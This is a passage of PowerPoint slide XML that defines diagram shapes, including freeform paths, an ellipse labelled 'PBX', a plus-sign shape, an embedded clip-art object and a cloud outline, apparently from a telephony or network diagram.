                <a:gd name="T5" fmla="*/ 37 h 165"/>
                <a:gd name="T6" fmla="*/ 2489 w 2489"/>
                <a:gd name="T7" fmla="*/ 37 h 165"/>
                <a:gd name="T8" fmla="*/ 2489 w 2489"/>
                <a:gd name="T9" fmla="*/ 9 h 165"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 60000 65536"/>
                <a:gd name="T13" fmla="*/ 0 60000 65536"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 w 2489"/>
                <a:gd name="T16" fmla="*/ 0 h 165"/>
                <a:gd name="T17" fmla="*/ 2489 w 2489"/>
                <a:gd name="T18" fmla="*/ 165 h 165"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T10">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T12">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T13">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="T14">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T15" t="T16" r="T17" b="T18"/>
              <a:pathLst>
                <a:path w="2489" h="165">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="489" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="489" y="165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2489" y="165"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2489" y="23"/>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70" name="Oval 196"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1191" y="2826"/>
              <a:ext cx="286" cy="218"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="FF9900"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr" eaLnBrk="0" hangingPunct="0"/>
              <a:r>
                <a:rPr lang="en-US" altLang="en-US" sz="1400" b="1"/>
                <a:t>PBX</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98371" name="Freeform 197"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3359" y="2830"/>
              <a:ext cx="498" cy="164"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 498 w 498"/>
                <a:gd name="T1" fmla="*/ 47 h 172"/>
                <a:gd name="T2" fmla="*/ 498 w 498"/>
                <a:gd name="T3" fmla="*/ 0 h 172"/>
                <a:gd name="T4" fmla="*/ 0 w 498"/>
                <a:gd name="T5" fmla="*/ 0 h 172"/>
                <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 w 498"/>
                <a:gd name="T10" fmla="*/ 0 h 172"/>
                <a:gd name="T11" fmla="*/ 498 w 498"/>
                <a:gd name="T12" fmla="*/ 172 h 172"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T6">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T7">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T8">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T9" t="T10" r="T11" b="T12"/>
              <a:pathLst>
                <a:path w="498" h="172">
                  <a:moveTo>
                    <a:pt x="498" y="172"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="498" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="38100">
              <a:solidFill>
                <a:srgbClr val="A5002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72" name="AutoShape 198"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3311" y="2792"/>
              <a:ext cx="82" cy="80"/>
            </a:xfrm>
            <a:prstGeom prst="plus">
              <a:avLst>
                <a:gd name="adj" fmla="val 25000"/>
              </a:avLst>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="CCFFCC"/>
            </a:solidFill>
            <a:ln w="6350">
              <a:solidFill>
                <a:schemeClr val="tx1"/>
              </a:solidFill>
              <a:miter lim="800000"/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr"/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98373" name="Freeform 199"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="454" y="3065"/>
              <a:ext cx="3759" cy="237"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 3759 w 3759"/>
                <a:gd name="T1" fmla="*/ 0 h 249"/>
                <a:gd name="T2" fmla="*/ 3574 w 3759"/>
                <a:gd name="T3" fmla="*/ 0 h 249"/>
                <a:gd name="T4" fmla="*/ 3574 w 3759"/>
                <a:gd name="T5" fmla="*/ 49 h 249"/>
                <a:gd name="T6" fmla="*/ 2191 w 3759"/>
                <a:gd name="T7" fmla="*/ 48 h 249"/>
                <a:gd name="T8" fmla="*/ 2201 w 3759"/>
                <a:gd name="T9" fmla="*/ 30 h 249"/>
                <a:gd name="T10" fmla="*/ 2033 w 3759"/>
                <a:gd name="T11" fmla="*/ 66 h 249"/>
                <a:gd name="T12" fmla="*/ 2045 w 3759"/>
                <a:gd name="T13" fmla="*/ 48 h 249"/>
                <a:gd name="T14" fmla="*/ 0 w 3759"/>
                <a:gd name="T15" fmla="*/ 49 h 249"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                <a:gd name="T21" fmla="*/ 0 60000 65536"/>
                <a:gd name="T22" fmla="*/ 0 60000 65536"/>
                <a:gd name="T23" fmla="*/ 0 60000 65536"/>
                <a:gd name="T24" fmla="*/ 0 w 3759"/>
                <a:gd name="T25" fmla="*/ 0 h 249"/>
                <a:gd name="T26" fmla="*/ 3759 w 3759"/>
                <a:gd name="T27" fmla="*/ 249 h 2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59" h="249">
                  <a:moveTo>
                    <a:pt x="3759" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3574" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3574" y="184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2191" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2033" y="249"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2045" y="183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="184"/>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98374" name="Object 200"/>
            <p:cNvGraphicFramePr>
              <a:graphicFrameLocks noChangeAspect="1"/>
            </p:cNvGraphicFramePr>
            <p:nvPr/>
          </p:nvGraphicFramePr>
          <p:xfrm>
            <a:off x="333" y="2960"/>
            <a:ext cx="305" cy="448"/>
          </p:xfrm>
          <a:graphic>
            <a:graphicData uri="http://schemas.openxmlformats.org/presentationml/2006/ole">
              <mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
                <mc:Choice xmlns:v="urn:schemas-microsoft-com:vml" Requires="v">
                  <p:oleObj name="Clip" r:id="rId2" imgW="7322704" imgH="10697301" progId="">
                    <p:embed/>
                  </p:oleObj>
                </mc:Choice>
                <mc:Fallback>
                  <p:oleObj name="Clip" r:id="rId2" imgW="7322704" imgH="10697301"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 y="2960"/>
                          <a:ext cx="305" cy="4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8375" name="Group 201"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3630" y="1472"/>
              <a:ext cx="1531" cy="654"/>
              <a:chOff x="3595" y="1316"/>
              <a:chExt cx="1531" cy="687"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98386" name="Freeform 202"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3595" y="1316"/>
                <a:ext cx="1531" cy="687"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 163843 w 1279"/>
                  <a:gd name="T1" fmla="*/ 1188 h 643"/>
                  <a:gd name="T2" fmla="*/ 164226 w 1279"/>
                  <a:gd name="T3" fmla="*/ 871 h 643"/>
                  <a:gd name="T4" fmla="*/ 161956 w 1279"/>
                  <a:gd name="T5" fmla="*/ 548 h 643"/>
                  <a:gd name="T6" fmla="*/ 157613 w 1279"/>
                  <a:gd name="T7" fmla="*/ 284 h 643"/>
                  <a:gd name="T8" fmla="*/ 151543 w 1279"/>
                  <a:gd name="T9" fmla="*/ 118 h 643"/>
                  <a:gd name="T10" fmla="*/ 144368 w 1279"/>
                  <a:gd name="T11" fmla="*/ 57 h 643"/>
                  <a:gd name="T12" fmla="*/ 136875 w 1279"/>
                  <a:gd name="T13" fmla="*/ 126 h 643"/>
                  <a:gd name="T14" fmla="*/ 130526 w 1279"/>
                  <a:gd name="T15" fmla="*/ 84 h 643"/>
                  <a:gd name="T16" fmla="*/ 121989 w 1279"/>
                  <a:gd name="T17" fmla="*/ 0 h 643"/>
                  <a:gd name="T18" fmla="*/ 115260 w 1279"/>
                  <a:gd name="T19" fmla="*/ 57 h 643"/>
                  <a:gd name="T20" fmla="*/ 108325 w 1279"/>
                  <a:gd name="T21" fmla="*/ 249 h 643"/>
                  <a:gd name="T22" fmla="*/ 102893 w 1279"/>
                  <a:gd name="T23" fmla="*/ 172 h 643"/>
                  <a:gd name="T24" fmla="*/ 94995 w 1279"/>
                  <a:gd name="T25" fmla="*/ 61 h 643"/>
                  <a:gd name="T26" fmla="*/ 87764 w 1279"/>
                  <a:gd name="T27" fmla="*/ 7 h 643"/>
                  <a:gd name="T28" fmla="*/ 79359 w 1279"/>
                  <a:gd name="T29" fmla="*/ 103 h 643"/>
                  <a:gd name="T30" fmla="*/ 71508 w 1279"/>
                  <a:gd name="T31" fmla="*/ 272 h 643"/>
                  <a:gd name="T32" fmla="*/ 65309 w 1279"/>
                  <a:gd name="T33" fmla="*/ 135 h 643"/>
                  <a:gd name="T34" fmla="*/ 56888 w 1279"/>
                  <a:gd name="T35" fmla="*/ 7 h 643"/>
                  <a:gd name="T36" fmla="*/ 49636 w 1279"/>
                  <a:gd name="T37" fmla="*/ 53 h 643"/>
                  <a:gd name="T38" fmla="*/ 41866 w 1279"/>
                  <a:gd name="T39" fmla="*/ 144 h 643"/>
                  <a:gd name="T40" fmla="*/ 35876 w 1279"/>
                  <a:gd name="T41" fmla="*/ 284 h 643"/>
                  <a:gd name="T42" fmla="*/ 28564 w 1279"/>
                  <a:gd name="T43" fmla="*/ 90 h 643"/>
                  <a:gd name="T44" fmla="*/ 21456 w 1279"/>
                  <a:gd name="T45" fmla="*/ 61 h 643"/>
                  <a:gd name="T46" fmla="*/ 14366 w 1279"/>
                  <a:gd name="T47" fmla="*/ 144 h 643"/>
                  <a:gd name="T48" fmla="*/ 8663 w 1279"/>
                  <a:gd name="T49" fmla="*/ 328 h 643"/>
                  <a:gd name="T50" fmla="*/ 4515 w 1279"/>
                  <a:gd name="T51" fmla="*/ 594 h 643"/>
                  <a:gd name="T52" fmla="*/ 2720 w 1279"/>
                  <a:gd name="T53" fmla="*/ 928 h 643"/>
                  <a:gd name="T54" fmla="*/ 3768 w 1279"/>
                  <a:gd name="T55" fmla="*/ 1254 h 643"/>
                  <a:gd name="T56" fmla="*/ 3151 w 1279"/>
                  <a:gd name="T57" fmla="*/ 1562 h 643"/>
                  <a:gd name="T58" fmla="*/ 1281 w 1279"/>
                  <a:gd name="T59" fmla="*/ 1948 h 643"/>
                  <a:gd name="T60" fmla="*/ 1533 w 1279"/>
                  <a:gd name="T61" fmla="*/ 2282 h 643"/>
                  <a:gd name="T62" fmla="*/ 0 w 1279"/>
                  <a:gd name="T63" fmla="*/ 2628 h 643"/>
                  <a:gd name="T64" fmla="*/ 894 w 1279"/>
                  <a:gd name="T65" fmla="*/ 2919 h 643"/>
                  <a:gd name="T66" fmla="*/ 4221 w 1279"/>
                  <a:gd name="T67" fmla="*/ 3205 h 643"/>
                  <a:gd name="T68" fmla="*/ 9573 w 1279"/>
                  <a:gd name="T69" fmla="*/ 3422 h 643"/>
                  <a:gd name="T70" fmla="*/ 16254 w 1279"/>
                  <a:gd name="T71" fmla="*/ 3534 h 643"/>
                  <a:gd name="T72" fmla="*/ 22757 w 1279"/>
                  <a:gd name="T73" fmla="*/ 3548 h 643"/>
                  <a:gd name="T74" fmla="*/ 29496 w 1279"/>
                  <a:gd name="T75" fmla="*/ 3596 h 643"/>
                  <a:gd name="T76" fmla="*/ 37220 w 1279"/>
                  <a:gd name="T77" fmla="*/ 3601 h 643"/>
                  <a:gd name="T78" fmla="*/ 45007 w 1279"/>
                  <a:gd name="T79" fmla="*/ 3523 h 643"/>
                  <a:gd name="T80" fmla="*/ 51694 w 1279"/>
                  <a:gd name="T81" fmla="*/ 3719 h 643"/>
                  <a:gd name="T82" fmla="*/ 59363 w 1279"/>
                  <a:gd name="T83" fmla="*/ 3824 h 643"/>
                  <a:gd name="T84" fmla="*/ 66360 w 1279"/>
                  <a:gd name="T85" fmla="*/ 3839 h 643"/>
                  <a:gd name="T86" fmla="*/ 74598 w 1279"/>
                  <a:gd name="T87" fmla="*/ 3768 h 643"/>
                  <a:gd name="T88" fmla="*/ 82019 w 1279"/>
                  <a:gd name="T89" fmla="*/ 3621 h 643"/>
                  <a:gd name="T90" fmla="*/ 88171 w 1279"/>
                  <a:gd name="T91" fmla="*/ 3560 h 643"/>
                  <a:gd name="T92" fmla="*/ 97393 w 1279"/>
                  <a:gd name="T93" fmla="*/ 3616 h 643"/>
                  <a:gd name="T94" fmla="*/ 104589 w 1279"/>
                  <a:gd name="T95" fmla="*/ 3579 h 643"/>
                  <a:gd name="T96" fmla="*/ 112571 w 1279"/>
                  <a:gd name="T97" fmla="*/ 3440 h 643"/>
                  <a:gd name="T98" fmla="*/ 118721 w 1279"/>
                  <a:gd name="T99" fmla="*/ 3517 h 643"/>
                  <a:gd name="T100" fmla="*/ 126599 w 1279"/>
                  <a:gd name="T101" fmla="*/ 3621 h 643"/>
                  <a:gd name="T102" fmla="*/ 134089 w 1279"/>
                  <a:gd name="T103" fmla="*/ 3625 h 643"/>
                  <a:gd name="T104" fmla="*/ 141055 w 1279"/>
                  <a:gd name="T105" fmla="*/ 3694 h 643"/>
                  <a:gd name="T106" fmla="*/ 147800 w 1279"/>
                  <a:gd name="T107" fmla="*/ 3691 h 643"/>
                  <a:gd name="T108" fmla="*/ 154408 w 1279"/>
                  <a:gd name="T109" fmla="*/ 3575 h 643"/>
                  <a:gd name="T110" fmla="*/ 159630 w 1279"/>
                  <a:gd name="T111" fmla="*/ 3358 h 643"/>
                  <a:gd name="T112" fmla="*/ 162936 w 1279"/>
                  <a:gd name="T113" fmla="*/ 3070 h 643"/>
                  <a:gd name="T114" fmla="*/ 163843 w 1279"/>
                  <a:gd name="T115" fmla="*/ 2784 h 643"/>
                  <a:gd name="T116" fmla="*/ 163092 w 1279"/>
                  <a:gd name="T117" fmla="*/ 2420 h 643"/>
                  <a:gd name="T118" fmla="*/ 163843 w 1279"/>
                  <a:gd name="T119" fmla="*/ 2035 h 643"/>
                  <a:gd name="T120" fmla="*/ 162218 w 1279"/>
                  <a:gd name="T121" fmla="*/ 1624 h 64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279"/>
                  <a:gd name="T184" fmla="*/ 0 h 643"/>
                  <a:gd name="T185" fmla="*/ 1279 w 1279"/>
                  <a:gd name="T186" fmla="*/ 643 h 64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279" h="643">
                    <a:moveTo>
                      <a:pt x="1253" y="249"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="1259" y="240"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1264" y="230"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1268" y="220"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1272" y="209"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1275" y="198"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1277" y="187"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1278" y="176"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1279" y="164"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1278" y="154"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1278" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1276" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1274" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1271" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1268" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1265" y="100"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1261" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1256" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1251" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1245" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1240" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1233" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1227" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1220" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1212" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1205" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1197" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1188" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1180" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1171" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1162" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1153" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1143" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1134" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1124" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1111" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1099" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1088" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1076" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1065" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1054" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1044" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1035" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1026" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1016" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1006" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="995" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="984" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="973" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="962" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="950" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="939" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="928" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="917" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="907" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="897" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="887" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="878" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="869" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="860" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="852" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="844" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="837" y="49"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="828" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="819" y="39"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="810" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="800" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="790" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="780" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="770" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="760" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="749" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="739" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="728" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="717" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="706" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="694" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="683" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="671" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="660" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="649" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="638" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="627" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="617" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="606" y="22"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="596" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="586" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="576" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="567" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="557" y="46"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="548" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="538" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="529" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="519" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="508" y="22"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="498" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="487" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="477" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="466" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="454" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="443" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="431" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="420" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="409" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="398" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="387" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="376" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="366" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="355" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="345" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="335" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="325" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="316" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="306" y="33"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="297" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="288" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="279" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="271" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="262" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="252" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="243" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="232" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="222" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="211" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="200" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="188" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="177" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="167" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="157" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="148" y="12"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="139" y="14"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="130" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="121" y="20"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="96" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="37"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="81" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="74" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="67" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="61" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="76"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="45" y="83"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="100"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="108"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="117"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="126"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="135"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="145"/>
                    </a:lnTo>
